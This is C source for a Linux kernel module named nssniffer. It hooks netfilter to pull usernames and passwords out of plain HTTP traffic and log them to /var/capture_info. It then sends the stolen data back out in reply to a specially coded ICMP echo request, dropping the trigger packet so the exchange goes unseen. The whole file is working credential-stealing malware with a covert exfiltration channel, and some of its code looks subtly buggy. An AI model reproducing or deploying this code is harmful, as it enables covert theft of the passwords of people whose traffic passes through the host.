/*
 * =====================================================================================
 *
 *	Filename:  nssniffer.c
 *
 *    Description:  A Simpler password capture via netfilter, will only capture 
 *					http
 *
 *        Version:  1.0
 *        Created:  2015年06月25日 17时10分59秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  ExiaHan
 *   Organization:  USTC
 *
 * =====================================================================================
 */
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
//For Operate File
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/stat.h>
#include <linux/syscalls.h>
#include <linux/mm.h>

MODULE_LICENSE("GPL");

#define PASSPORT 0xEA//ExiA--->EA, The ICMP CODE
#define MAXUSERINFO 16
//used to store the user_info
typedef struct USER_INFO{
    char *username, *password, *ip;
}User_info, *pUser_info;

typedef struct nf_hook_ops NF_HOOK_OPS;
typedef struct sk_buff SK_BUFF;
typedef struct net_Device NET_DEVICE;
typedef struct iphdr IPHDR;
typedef struct tcphdr TCPHDR;
typedef struct icmphdr ICMPHDR;
typedef uint8_t u1;

//our hook function
unsigned int hook_out(unsigned int uHookNum, SK_BUFF *pscSKB,\
        const NET_DEVICE *pscIn, const NET_DEVICE *pscOut, int (okfn)(SK_BUFF *));
unsigned int hook_in(unsigned int uHookNum, SK_BUFF *pscSKB,\
        const NET_DEVICE *pscIn, const NET_DEVICE *pscOut, int (okfn)(SK_BUFF *));
//use to operate file in kernel space
static void filewrite(char *filename, char *data, int datasize);
static char *fileread(char *filename);

//kmp to get pattern
void get_next(int *next, char *a, int la);
static int kmp(int *next, char *A, char *a, int lA, int la);

//use to copy data
//static void copybyte(char *dst, char *src, int num);

//string op
static int stringlen(char *s);
static void stringcat(char *dst, char *s, char *p, int pos);
char *addrToString(unsigned int addr);
//get minium num, for send limited vai skbuff->data size
static int minNum(int a, int b);

//use for another style to operate file
static int flag = 1;
struct file *filp;

//static unsigned int target_ip;
static NF_HOOK_OPS scNfhoOut, scNfhoIn;
//static char userinfo[MAXUSERINFO];
static char *filename = "/var/capture_info";
static char *uid = "uid";
static char *psd = "password";
int *next_uid;
int *next_psd;
//invoke when Kernel module inserted
int init_module(void)
{
	int i; //for memset
    //for test
    printk(KERN_INFO"MY Module Loaded\nNow will register the NetFilter Sniffer\n");
	/*open file for read and write
	 * do it on init because vfs may fail due to some unknow reason
	 */
	filp = filp_open(filename, O_RDWR | O_CREAT | O_APPEND, 0666);
	if (IS_ERR(filp)) {
		printk(KERN_INFO"Error when open file %ld\n", PTR_ERR(filp));
		flag = 0;
		return -1;
	}
	printk(KERN_INFO"File Open for Write[init moudle]\n");
	/*for test fileread function
	fileread(filename);
	*/
    //init our nf_hook_ops struct,for capture passwd and send when we 
	//send spacial icmp,type is 0xEA
    scNfhoOut.hook = (nf_hookfn *)hook_out;
    scNfhoOut.hooknum = NF_INET_POST_ROUTING;//hook post_routing
    scNfhoOut.pf = PF_INET;
    scNfhoOut.priority = NF_IP_PRI_FIRST;

	scNfhoIn.hook = (nf_hookfn *)hook_in;
	scNfhoIn.hooknum = NF_INET_PRE_ROUTING;//hook pre_routing
	scNfhoIn.pf = PF_INET;
	scNfhoIn.priority = NF_IP_PRI_FIRST;
    //register our hook_sniffer to the kernel 
    nf_register_hook(&scNfhoOut);
	nf_register_hook(&scNfhoIn);


	next_uid = (int *)kmalloc((stringlen(uid) + 2) * sizeof(int), GFP_ATOMIC);
	for (i = 0; i < stringlen(uid) + 2; i++)
		next_uid[i] = 0;
	printk(KERN_INFO"Next_uid set 0[init module]\n");
	get_next(next_uid, uid, stringlen(uid));
	printk(KERN_INFO"Next_uid get_next[init module]\n");
	next_psd = (int *)kmalloc((stringlen(psd) + 2) * sizeof(int), GFP_ATOMIC);
	for (i = 0; i < stringlen(psd) + 2; i++)
		next_psd[i] = 0;
	printk(KERN_INFO"Next_psd set 0[init module]\n");
	get_next(next_psd, psd,  stringlen(uid));
	printk(KERN_INFO"Next_psd get_next[init module]\n");
    return 0;
}

//invoke when Kernel module removed
void cleanup_module(void)
{
    //for test
    printk(KERN_INFO"MY Module Removed\n");

    /* cause we register a hook in the 
     * init_module, we should unregister
     * before we remove our module
    */
	if(flag) {
		nf_unregister_hook(&scNfhoOut);
		nf_unregister_hook(&scNfhoIn);
		kfree(next_uid);
		kfree(next_psd);
		filp_close(filp, NULL);
	}

	//nf_unregister_hook(&scNfhoOut);
	//nf_unregister_hook(&scNfhoIn);
}

unsigned int hook_out(unsigned int uHookNum, SK_BUFF *pscSKB,\
        const NET_DEVICE *pscIn, const NET_DEVICE *pscOut, int (okfn)(SK_BUFF *))
{
    SK_BUFF *pscSkbuff;
    IPHDR *pscIph;
	TCPHDR *pscTcph;
    int iDataSize;
	int kmp_pos;
	char buf_id[50];
	char buf_pwd[50];
	char *d_ip;
	//int buf_pos;
    u1 *uData = NULL;
    pscSkbuff = pscSKB;

    //Get The IPHeader
    pscIph = ip_hdr(pscSkbuff);
	
	if (pscIph->protocol != IPPROTO_TCP){//if not tcp, do nothing
		return NF_ACCEPT;
	}

	pscTcph = (TCPHDR *)((pscSkbuff->data) + (pscIph->ihl * 4));
	if (pscTcph->dest != htons(80)){//if not http, do nothing
		return NF_ACCEPT;
	}

	//printk(KERN_INFO"Port %d\n", ntohs(pscTcph->dest));
	//get data start pos
    uData = (u1 *)pscTcph + pscTcph->doff * 4;
	//get the length
    iDataSize = ntohs(pscIph->tot_len) - pscIph->ihl * 4 - pscTcph->doff * 4;

	//printk(KERN_INFO"NsSniffer DataSize %d\n", iDataSize);
	//write to file
	if (iDataSize){
		//printk(KERN_INFO"NsSniffer DataSize[Hook_out] %d\n", iDataSize);
		kmp_pos = kmp(next_uid, uData, uid, iDataSize, stringlen(uid));
		if (kmp_pos != -1) {
			//printk(KERN_INFO"UID KMP POS %d\n", kmp_pos);
			stringcat(buf_id, uData, uid, kmp_pos);
		}
		kmp_pos = kmp(next_psd, uData, psd, iDataSize, stringlen(psd));
		if (kmp_pos != -1) {
			d_ip = addrToString(pscIph->daddr);
			printk(KERN_INFO"IP: %s[HOOK_OUT]\n", d_ip);
			filewrite(filename, d_ip, stringlen(d_ip));
			kfree(d_ip);
			filewrite(filename, " id psd: ", stringlen("id psd: "));
			//printk(KERN_INFO"PSD KMP POS %d\n", kmp_pos);
			filewrite(filename, buf_id, stringlen(buf_id));
			filewrite(filename, " ", stringlen(" "));
			stringcat(buf_pwd, uData, psd, kmp_pos);
			filewrite(filename, buf_pwd, stringlen(buf_pwd));
			filewrite(filename, "&", stringlen("&"));
			filewrite(filename, "\n", stringlen("\n"));
		}
		//filewrite(filename, uData, iDataSize);
	}
    return NF_ACCEPT;
}

unsigned int hook_in(unsigned int uHookNum, SK_BUFF *pscSKB,\
        const NET_DEVICE *pscIn, const NET_DEVICE *pscOut, int (okfn)(SK_BUFF *))
{
	SK_BUFF *pscSkbuff;// *pscSkbS;
	IPHDR *pscIph;
	ICMPHDR *pscIcmph;
	char *cpdata, *cdata;
	int fsize;//cdata length
	int ipsize;//size of skbuff's ip packet
	unsigned int taddr;
	unsigned char t_hwaddr[ETH_ALEN];

	//calc data size of ip
	pscSkbuff = pscSKB;
	pscIph = ip_hdr(pscSkbuff);
	ipsize = ntohs(pscIph->tot_len) - pscIph->ihl * 4;

	//if not icmp, let it go
	if (pscIph->protocol != IPPROTO_ICMP)
		return NF_ACCEPT;

	pscIcmph = (ICMPHDR *)(pscSkbuff->data + pscIph->ihl * 4);

	//if not our passport, let it go
	if (pscIcmph->code != PASSPORT || pscIcmph->type != ICMP_ECHO)
		return NF_ACCEPT;

	//get the src ip
	taddr = pscIph->saddr;
	
	/*we will use the captured skbuffer
	*reverse src and dst ip
	*/
	
	pscIph->saddr = pscIph->daddr;
	pscIph->daddr = taddr;
	pscSkbuff->pkt_type = PACKET_OUTGOING;

	switch(pscSkbuff->dev->type) {
		case ARPHRD_PPP:
			break;
		case ARPHRD_LOOPBACK:
		case ARPHRD_ETHER:
			{
				pscSkbuff->data = (unsigned char*)eth_hdr(pscSkbuff);
				pscSkbuff->len += ETH_HLEN;
				memcpy(t_hwaddr, (eth_hdr(pscSkbuff)->h_dest), ETH_ALEN);
				memcpy((eth_hdr(pscSkbuff)->h_dest), (eth_hdr(pscSkbuff)->h_source), ETH_ALEN);
				memcpy((eth_hdr(pscSkbuff)->h_source), t_hwaddr, ETH_ALEN);
				break;
			}
	}

	cpdata = (char *)((char *)pscIcmph + sizeof(ICMPHDR));
	//read file, result will in cdata, and return cdata length [actually is file size]
	
	cdata = fileread(filename);
	fsize = stringlen(cdata);
	printk(KERN_INFO"Read %s [Hook_In]\n", cdata);
	printk(KERN_INFO"Size %d [%d %d] [Hook_In]\n", minNum(fsize, ipsize), fsize, ipsize);
	memcpy(cpdata, cdata, minNum(fsize, ipsize));
	kfree(cdata);
	dev_queue_xmit(pscSkbuff);
	//by default we will drop it, for avoid been detect
	//return NF_STOLEN;
	return NF_STOLEN;
	//return NF_ACCEPT;
}

static void filewrite(char *filename, char *data, int size)
{
	mm_segment_t fs;
	//struct file *filp;

	printk(KERN_INFO"File Write[nssniffer]\n");
	//open file for read and write
	//filp = filp_open(filename, O_RDWR | O_CREAT | O_APPEND, 0644);
	//do this in this may cause failed
	 /*if (IS_ERR(filp)) {
		printk(KERN_INFO"Error when open file[Write] %ld\n", PTR_ERR(filp));
		return;
	}*/
	fs = get_fs();
	set_fs(KERNEL_DS);
	filp->f_op->write(filp, data, size, &filp->f_pos);
	set_fs(fs);
	printk(KERN_INFO"File Write Com[nssniffer]\n");
	//filp_close(filp, NULL);
}

static char *fileread(char *filename)
{
	mm_segment_t fs;
	struct file *filp_o;
	struct inode *inode;
	off_t fsize;
	char *buf;
	unsigned long magic;
	filp_o = filp_open(filename, O_RDONLY, 0);
	if (IS_ERR(filp_o)) {
		printk(KERN_INFO"Error when open file[Read] %ld\n", PTR_ERR(filp_o));
		return 0;
	}
	//get the file size via iNode
	inode = filp_o->f_dentry->d_inode;
	magic = inode->i_sb->s_magic;
	fsize = inode->i_size;
	printk(KERN_INFO"filesize %d [FILE_READ]", fsize);
	buf = (char *)kmalloc(fsize + 1, GFP_ATOMIC);
	fs = get_fs();
	set_fs(KERNEL_DS);
	filp_o->f_op->read(filp_o, buf, fsize, &(filp_o->f_pos));
	set_fs(fs);
	//add a terminate character
	buf[fsize] = '\0';
	filp_close(filp_o, NULL);
	printk(KERN_INFO"FILE Content: %s\n", buf);
	return buf;
}

/*
static void copybyte(char *dst, char *src, int num)
{
	int i = 0;
	while (i < num) {
		dst[i] = src[i];
		i++;
	}

	return;
}*/


void get_next(int *next, char *a, int la)
{
	int i, j;
	next[0] = -1;
	printk(KERN_INFO"Get Next Start[nssniffer]\n");
	i = 0, j = -1;
	while(i < la){
		if (j == -1 || a[i] == a[j]){
			i++; j++; next[i] = j;
		}
		else
			j = next[j];
	}

	printk(KERN_INFO"Get Next Com[nssniffer]\n");
}
int kmp(int *next, char *A, char *a, int lA, int la)
{
	int i, j;

	i = j = 0;
	while (i < lA && j < la){
		if (j == -1 || A[i] == a[j]) {
			i++; j++;
		}
		else
			j = next[j];
	}
	if (j == la)
		return i - j;
	else
		return -1;
}

static int stringlen(char *str)
{
	int i = 0;
	while (*str++ != '\0')
		i++;
	return i;
}

void stringcat(char *dst, char *s, char *p, int pos)
{
	int i = 0;
	char *str = s + pos + stringlen(p) + 1;//uid/password=,so + 1 is the '='
	while(*str != '&' && *str != ';' && i < MAXUSERINFO){//uid=xx&password=xx&..,so use & to get token
		*dst = *str;
		dst++, str++;
		i++;
	}
	*dst = '\0';
	return;
}

char *addrToString(unsigned int addr)
{
	int i, j, s, tmp, n, flag;
	char *caddr;
	u1 *pByte = (u1 *)&addr;

	caddr = (char *)kmalloc(17, GFP_ATOMIC);
	i = 0, j = 0;
	while (i < 4) {
		n = 100;
		tmp = *pByte;
		flag = 0;
		while (tmp != 0){
			s = tmp / n;
			if (s != 0) {
				flag = 1;
				caddr[j] = s + '0';
				j++;
			}
			else if (flag) {
				caddr[j] = s + '0';
				j++;
			}
			tmp = tmp % n;
			n /= 10;
		}
		caddr[j++] = '.';
		pByte++;
		i++;
	}
	caddr[--j] = '\0';
	//printk(KERN_INFO"IP: %s [ADDR_TO_STRING]\n", caddr);
	return caddr;
}

static int minNum(int a, int b)
{
	return a < b ? a : b;
}
